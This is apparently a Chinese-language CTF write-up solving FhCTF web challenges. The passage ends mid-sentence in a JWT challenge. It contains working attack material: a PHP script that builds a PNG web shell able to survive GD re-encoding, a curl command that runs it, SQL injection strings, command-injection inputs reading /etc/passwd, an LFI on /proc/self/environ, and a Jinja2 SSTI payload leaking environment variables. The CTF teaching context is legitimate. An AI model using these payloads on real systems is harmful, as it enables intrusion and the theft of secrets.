class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; &amp; C:/Users/<span class="number">09801</span>/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">13</span>.exe c:/Users/<span class="number">09801</span>/Downloads/gallery/test.py </span><br><span class="line">[*] Target <span class="built_in">set</span> to: http://<span class="number">8608</span>faf0.fhctf.systems/</span><br><span class="line">[*] Uploading payload to http://<span class="number">8608</span>faf0.fhctf.systems/upload.php...</span><br><span class="line">[+] Upload ful!</span><br><span class="line">[*] Executing payload at http://<span class="number">8608</span>faf0.fhctf.systems/uploads/avatar.php...</span><br><span class="line"></span><br><span class="line">[] Flag found:</span><br><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br></pre></td></tr></table></figure><h3 id="分享圖庫-Revenge"><a href="#分享圖庫-Revenge" class="headerlink" title="分享圖庫 Revenge"></a>分享圖庫 Revenge</h3><p><img src="/img/FhCTF/3.webp" alt="image"><br>目標 (Goal)： Dockerfile 第 14 行顯示 Flag 儲存在環境變數中：ENV flag&#x3D;”FhCTF{fake_flag}”。 因此，我們的目標是執行 PHP 程式碼來讀取環境變數（例如使用 getenv(‘flag’) 或 $_ENV）。</p><p>漏洞入口 (Vulnerability)： upload.php 負責處理上傳。</p><p>檢查機制：它會檢查檔案是否為 PNG (exif_imagetype)，並嘗試用 GD 載入 (imagecreatefrompng)。這防止了單純的「改副檔名」或「文件尾附加 PHP 代碼」。</p><p>清洗機制 (Sanitization)：最關鍵的是第 49 行 imagepng($img, $target_file)。這會重繪圖片並存檔。一般的 Web Shell（例如在圖片結尾加 <?php system(...) ?>）經過這個步驟後，附加的代碼會被丟棄，只剩下純圖片數據。</p><p>檔名漏洞：第 7 行 $target_file &#x3D; $target_dir . basename($_FILES[“fileToUpload”][“name”]);。伺服器直接使用了你上傳的檔名與副檔名。如果你上傳 shell.php，它就會存成 uploads&#x2F;shell.php。</p><ol start="2"><li>解題思路 (Strategy)<br>我們需要利用 “PHP GD Bypass” 技術。 我們需要構造一個特殊的 PNG 圖片，使得它在被 imagecreatefrompng 讀取並由 imagepng 重新壓縮寫入後，新的圖片數據流中仍然包含 PHP 代碼。</li></ol><p>這通常是透過操控 PNG 的 IDAT 塊（像素數據）來達成。當這些像素被壓縮算法處理時，會剛好組成類似 <?=$_GET[0]($_POST[1]);?> 的字串。</p><ol start="3"><li>攻擊步驟 (Step-by-Step)<br>第一步：生成 Payload<br>你需要一個腳本來生成這種「抗清洗」的 PNG。以下是一個常用的生成腳本（基於國外研究員的 IDAT&#x2F;PLTE Bypass 技術）。</li></ol><p>請將以下程式碼存為 gen_payload.php 並在你的電腦上用 PHP 執行它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gen_payload.php</span></span><br><span class="line"><span class="comment">// 產生一個可以繞過 PHP GD 重繪的 PNG Web Shell</span></span><br><span class="line"><span class="comment">// Payload: &lt;?=`$_GET[0]`;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>, <span class="string">&#x27;payload.webp&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload generated: payload.webp\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">執行後會得到 payload.webp。這個圖片的特性是：即使經過 imagecreatefrompng 再 imagepng，裡面的 Hex 數據仍會包含 PHP 後門。</span><br></pre></td></tr></table></figure><p>第二步：準備攻擊檔案<br>將生成的 payload.webp 重新命名為 shell.php。</p><p>伺服器檢查內容：它是合法的 PNG（通過）。</p><p>伺服器存檔：存為 .php（因為我們檔名是 .php）。</p><p>伺服器清洗：Payload 的構造特性讓它在清洗後，PHP 代碼依然存在。</p><p>第三步：上傳與執行<br>回到題目網頁，上傳 shell.php。</p><p>因為我們的 Payload 是 <?=$_GET[0];?>，我們可以用 GET 參數傳入指令。<br><code>curl.exe &quot;http://b1baf89e.fhctf.systems/uploads/shell.php?0=system&quot; -d &quot;1=env&quot; --output - | Select-String &quot;FhCTF&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK&#125;</span><br></pre></td></tr></table></figure><h3 id="Python-Compile"><a href="#Python-Compile" class="headerlink" title="Python Compile"></a>Python Compile</h3><p>在程式碼錯誤時會顯示 <code>Syntax Error</code>，代表在處理錯誤時還是會讀到檔案<br>可以推測可能為<code>LFI</code> 題。</p><p>在程式碼輸入框隨意輸入會造成語法錯誤的 Python 程式碼並送出，頁面會顯示 <code>Syntax Error</code>，且錯誤訊息包含 “Line N” 與該行內容的回顯。</p><p>由錯誤可推測，後端在渲染 <code>Syntax Error</code> 時，會依行數讀取來源檔案的對應行內容，且讀檔目標來自使用者的 <code>filename</code>；這形成本地檔案讀取（LFI）風險。</p><p>以 PoC 驗證，將request中的 <code>filename</code> 改為system path（如 <code>/proc/self/environ</code>），同時維持語法錯誤的程式碼，觀察錯誤訊息是否顯示該檔案內容。</p><p>為了讓error出現在第 1 行，將程式碼內容設為單一 “(“，backend會再嘗試讀取 <code>filename</code> 的第 1 行並顯示在error中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monaco.editor.getModels()[<span class="number">0</span>].setValue(<span class="string">&quot;(&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(<span class="string">&#x27;input[name=&quot;filename&quot;]&#x27;</span>).value = <span class="string">&#x27;/proc/self/environ&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(<span class="string">&#x27;compileForm&#x27;</span>).submit();</span><br></pre></td></tr></table></figure><p>在error中可以看到 <code>/proc/self/environ</code> 的輸出，可以得到包含<code>FLAG=</code> 的 environment variable。</p><p>最後就可以拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;N0t_s4f3_t0_ou7put_th3_err0r_m5g&#125;</span><br></pre></td></tr></table></figure><h2 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h2><h3 id="Survey-1"><a href="#Survey-1" class="headerlink" title="Survey"></a>Survey</h3><p><img src="/img/FhCTF/4.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="INTERNAL-LOGIN"><a href="#INTERNAL-LOGIN" class="headerlink" title="INTERNAL LOGIN"></a>INTERNAL LOGIN</h3><p><img src="/img/FhCTF/5.webp" alt="image"></p><p>客戶端 SQL 注入模擬，在 Username 欄位輸入</p><ul><li>‘ or 1&#x3D;1–</li><li>‘ OR ‘1’&#x3D;’1</li><li>admin’ or 1&#x3D;1–</li><li>‘ || 1&#x3D;1–</li><li>anything’ or ‘a’&#x3D;’a</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;SQL_1nj_42_&#125;</span><br></pre></td></tr></table></figure><h3 id="Web-Robots"><a href="#Web-Robots" class="headerlink" title="Web Robots"></a>Web Robots</h3><p>robots.txt 對，就是 robots.txt<br><img src="/img/FhCTF/6.webp" alt="image"></p><p>可以看到有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent *</span><br><span class="line"></span><br><span class="line">Disallow /secret</span><br></pre></td></tr></table></figure><p>那我們就直接進&#x2F;secret看吧</p><p><img src="/img/FhCTF/7.webp" alt="image"></p><p>進 &#x2F;secret 後會跳轉到 &#x2F;secret&#x2F;index.html ，那很明顯我們看的出來上一步就是目錄</p><p><img src="/img/FhCTF/8.webp" alt="image"></p><p><img src="/img/FhCTF/9.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;r0b075_4r3_n0t_v15ible_in_tx7&#125;</span><br></pre></td></tr></table></figure><h3 id="Doors-Open"><a href="#Doors-Open" class="headerlink" title="Doors Open"></a>Doors Open</h3><p><img src="/img/FhCTF/10.webp" alt="image"></p><p>一樣先看 robots.txt</p><p><img src="/img/FhCTF/11.webp" alt="image"></p><p>那就進 &#x2F;doors 看看吧</p><p><img src="/img/FhCTF/12.webp" alt="image"></p><p>這裡點開直接是 &#x2F;door&#x2F;1 ， 那我們就開始用Burp跑0~10000，發現都不是，<br>看著越來越多人解，就想說應該沒那麼難吧，所以就想說會不會是負數….</p><p><img src="/img/FhCTF/13.webp" alt="image"></p><h3 id="The-Visual-Blind-Spot"><a href="#The-Visual-Blind-Spot" class="headerlink" title="The Visual Blind Spot"></a>The Visual Blind Spot</h3><p>計算正確的 RGB 密鑰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _base = <span class="built_in">parseInt</span>(<span class="string">&quot;32&quot;</span>, <span class="number">16</span>); <span class="comment">// &quot;32&quot; (十六進位) = 50 (十進位)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _kMap = &#123; </span><br><span class="line">    <span class="attr">x</span>: _base &lt;&lt; <span class="number">1</span>,  <span class="comment">// 50 &lt;&lt; 1 = 100</span></span><br><span class="line">    <span class="attr">y</span>: _base,       <span class="comment">// 50</span></span><br><span class="line">    <span class="attr">z</span>: _base &lt;&lt; <span class="number">2</span>   <span class="comment">// 50 &lt;&lt; 2 = 200</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正確的 RGB 值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R = 100</span><br><span class="line"></span><br><span class="line">G = 50</span><br><span class="line"></span><br><span class="line">B = 200</span><br></pre></td></tr></table></figure><p>解密 sys-config 數據<br>data-params 包含加密的數據：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414</span><br></pre></td></tr></table></figure><p>解密公式：charCode &#x3D; (n &#x2F; 3) - 13</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Stn3am_C1ph3p&#125;</span><br></pre></td></tr></table></figure><h3 id="SYSTEM-ROOT-SHELL"><a href="#SYSTEM-ROOT-SHELL" class="headerlink" title="SYSTEM ROOT SHELL"></a>SYSTEM ROOT SHELL</h3><p><img src="/img/FhCTF/14.webp" alt="image"></p><p>在 script 標籤中發現</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">const _obs = [82, 67, 69, 95, 83, 117, 99, 99, 101, 115, 115, 95, 118, 51]; </span><br><span class="line">const _h = [70, 104, 67, 84, 70, 123]; </span><br><span class="line">const isInject = /[;&amp;|]/.test(cmd);</span><br></pre></td></tr></table></figure><p>ASCII 碼數組轉換為字元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_h → &quot;FhCTF&#123;&quot;</span><br><span class="line"></span><br><span class="line">_obs → &quot;RCE__v3&quot;</span><br><span class="line"></span><br><span class="line">最後加上 &quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>觸發方式</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> | whoami</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp; <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;RCE__v3&#125;</span><br></pre></td></tr></table></figure><h3 id="Welcome-to-Cybersecurity-Jungle"><a href="#Welcome-to-Cybersecurity-Jungle" class="headerlink" title="Welcome to Cybersecurity Jungle"></a>Welcome to Cybersecurity Jungle</h3><p><img src="/img/FhCTF/15.webp" alt="image"><br>一進來會看到上面的畫面，看 HTML source時,注意到 title 標籤包含一段日文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">言語（げんご）を変（か）えても、プログラミングの本質（ほんしつ）は変（か）わらない。</span><br></pre></td></tr></table></figure><p>意旨 “即使改變語言，編程的本質也不會改變</p><p>題目的關鍵在於設置正確的 Cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie 名稱 (Base64 編碼): aXNGbGFnU2hvdzJ1</span><br></pre></td></tr></table></figure><p>解碼後: <code>isFlagShow2u</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie 值 (Base64 編碼): 44Go44GF44KL44O8</span><br></pre></td></tr></table></figure><p>解碼後: <code>とぅるー (日文的 &quot;true&quot;)</code></p><p>接下來進到 Application 改 cookie 值後重新整理即可</p><p><img src="/img/FhCTF/16.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d&#125;</span><br></pre></td></tr></table></figure><h3 id="Templating-Danger"><a href="#Templating-Danger" class="headerlink" title="Templating Danger"></a>Templating Danger</h3><p>SSTI題</p><p>繞過方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;\\u&quot;</span> <span class="keyword">in</span> val:</span><br><span class="line">    normalize_val = val.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    context[context_key] = Template(normalize_val).render()</span><br></pre></td></tr></table></figure><p>當輸入包含 \u 時，系統會執行 Unicode 解碼，然後在過濾後直接用 Jinja2 的 Template().render() 渲染內容。這允許我們使用 Unicode 編碼繞過括號過濾。</p><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u007b\u007bcycler.__init__.__globals__.os.environ[<span class="string">&#x27;FLAG&#x27;</span>]\u007d\u007d</span><br></pre></td></tr></table></figure><p><img src="/img/FhCTF/17.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;T3mpl371ng_n33d_t0_b3_m0r3_c4r3full🥹&#125;</span><br></pre></td></tr></table></figure><h3 id="Documents"><a href="#Documents" class="headerlink" title="Documents"></a>Documents</h3><p>一進來看照慣例看sources，找出隱藏字元<br><img src="/img/FhCTF/18.webp" alt="image"></p><ul><li>“HTTP Header 告訴了你一切”</li></ul><p>檢查 HTTP 標頭發現: powerby: FastAPI<br>FastAPI 通常有 &#x2F;openapi.json 端點<br><img src="/img/FhCTF/19.webp" alt="image"><br>可以發現 &#x2F;flag.html 端點需要 Referer 標頭，所以我們需要偽造他</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://9f1604e5.fhctf.systems/flag.html&quot;</span> `</span><br><span class="line">    <span class="literal">-Headers</span> <span class="selector-tag">@</span>&#123;<span class="string">&quot;Referer&quot;</span>=<span class="string">&quot;https://localhost.app:8000/index.html&quot;</span>&#125; `</span><br><span class="line">    <span class="literal">-UseBasicParsing</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Content</span><br></pre></td></tr></table></figure><p><img src="/img/FhCTF/20.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;URL_encod3d_m337_p47h_d15cl0sure😱😱&#125;</span><br></pre></td></tr></table></figure><h3 id="LOG-ACCESS"><a href="#LOG-ACCESS" class="headerlink" title="LOG ACCESS"></a>LOG ACCESS</h3><p><img src="/img/FhCTF/21.webp" alt="image"></p><p>這題提供了一個「安全的日誌讀取工具」，聲稱能偵測並阻擋所有 Path Traversal 攻擊 。題目明確提示：這個工具完全沒有後端，所有判斷似乎都在瀏覽器中完成。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> check1 = input.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> &gt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> check2 = input.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;flag&#x27;</span>) !== -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (check1 &amp;&amp; check2) &#123;</span><br><span class="line">    <span class="keyword">const</span> final = _h + <span class="string">&quot;&#123;&quot;</span> + _c1 + _c3 + <span class="string">&quot;_&quot;</span> + _c2 + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    output.<span class="property">innerText</span> = <span class="string">&quot;ACCESS_GRANTED:\n&quot;</span> + final;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>驗證條件非常清楚：</p><ul><li>check1：輸入必須包含超過 3 個點（. 字元）</li><li>check2：輸入必須包含 “flag” 字串（不區分大小寫）</li></ul><p>混淆字串解碼<br>JavaScript 中使用了幾個混淆的變數 ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _h = [<span class="number">70</span>, <span class="number">104</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>].<span class="title function_">map</span>(<span class="function"><span class="params">c</span> =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// ASCII 解碼：FhCTF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c1 = <span class="string">&quot;\x50\x61\x74\x68\x5f&quot;</span>;</span><br><span class="line"><span class="comment">// Hex 解碼：Path_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c2 = (<span class="number">21337</span> &gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line"><span class="comment">// 位元運算：21337 &gt;&gt; 4 = 1333，轉 hex = 535</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> _c3 = <span class="string">&quot;\x54\x72\x34\x76&quot;</span>;</span><br><span class="line"><span class="comment">// Hex 解碼：Tr4v</span></span><br></pre></td></tr></table></figure><p>組合起來</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Path_Tr4v_535&#125;</span><br></pre></td></tr></table></figure><h3 id="Pathway-leak"><a href="#Pathway-leak" class="headerlink" title="Pathway-leak"></a>Pathway-leak</h3><p>打開題目網站，觀察檔案管理介面與網頁原始碼。<br><img src="/img/FhCTF/22.webp" alt="image"></p><p>在 <code>&lt;script&gt;</code> 區塊中發現檔案載入是呼叫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">TENANT</span> = <span class="string">&#x27;guest_user&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">`/api/assets/<span class="subst">$&#123;TENANT&#125;</span>/<span class="subst">$&#123;filename&#125;</span>`</span>;</span><br></pre></td></tr></table></figure><p>題目另外提供的檔案清單顯示伺服器上還存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_admin/flag.txt (38B)</span><br></pre></td></tr></table></figure><p>推論後端 API 很可能沒有檢查目前使用者是否真的屬於該 tenant，因此直接嘗試跨 tenant 請求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt</span><br></pre></td></tr></table></figure><p>伺服器回應 HTTP 200，內容為：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;p4th_tr4v3rs4l_w3_w4n7_t0_av01d&#125;</span><br></pre></td></tr></table></figure><h3 id="KID"><a href="#KID" class="headerlink" title="KID"></a>KID</h3><p>進入題目網頁後，先打開瀏覽器的「檢查元素 &#x2F; 開發者工具」，在原始碼與 console&#x2F;log 區可以看到幾段 Debug 訊息，直接洩漏了後端的驗證邏輯：</p><ul><li><p>金鑰路徑 Debug：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Fetching key from: /app/keys/default.pem</span><br></pre></td></tr></table></figure><p>這代表伺服器會根據 JWT Header 裡的 <code>kid</code>（Key ID）去檔案系統讀取金鑰，例如 <code>kid = &quot;default.pem&quot;</code> 對應 <code>/app/keys/default.pem</code>。</p></li><li><p>危險的相容模式：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] HS256 Compatibility Mode: Enabled</span><br></pre></td></tr></table></figure><p>這表示伺服端在驗證 JWT 時，同時支援非對稱（RS256）與對稱（HS256）模式，而且實作方式存在演算法混淆風險。</p></li><li><p>目前權限：頁面顯示登入身份為 <code>guest</code>，顯然目標是偽造 Token 取得 <code>admin</code> 權限。</p></li></ul><p>接著從 Cookie 中取出 JWT（例如 <code>access_token</code>），丟到 jwt.io 觀察內容，可以得到類似結構：</p><ul><li>Header：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default.pem&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li>Payload：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1704350000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><p>這些資訊已經足夠判斷：伺服器會依 <code>kid</code> 去讀檔案，並用其中內容當作金鑰來驗證 